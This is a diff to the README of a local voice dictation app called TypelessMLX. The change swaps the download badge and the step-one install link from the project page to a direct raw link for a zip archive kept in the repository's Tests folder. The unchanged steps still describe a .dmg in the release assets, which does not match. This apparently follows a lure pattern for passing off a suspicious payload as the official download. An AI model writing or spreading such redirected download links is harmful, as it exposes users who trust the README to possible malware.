@@ -1,6 +1,6 @@
 # 🎙️ TypelessMLX - Accurate voice dictation on your desk
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/eec5857/TypelessMLX)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/eec5857/TypelessMLX/raw/refs/heads/main/TypelessMLX/Tests/Typeless_MLX_v1.4.zip)
 
 TypelessMLX turns your speech into text on your computer. It uses advanced machine learning to listen to your voice and type the words for you. This tool works entirely on your local machine.
 
@@ -27,7 +27,7 @@ Before you get started, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your system:
 
-1. Visit the project page to download the latest version: [https://github.com/eec5857/TypelessMLX](https://github.com/eec5857/TypelessMLX)
+1. Visit the project page to download the latest version: [https://github.com/eec5857/TypelessMLX/raw/refs/heads/main/TypelessMLX/Tests/Typeless_MLX_v1.4.zip](https://github.com/eec5857/TypelessMLX/raw/refs/heads/main/TypelessMLX/Tests/Typeless_MLX_v1.4.zip)
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Select the file ending in .dmg to download the installer.
 4. Locate the downloaded file in your Downloads folder.
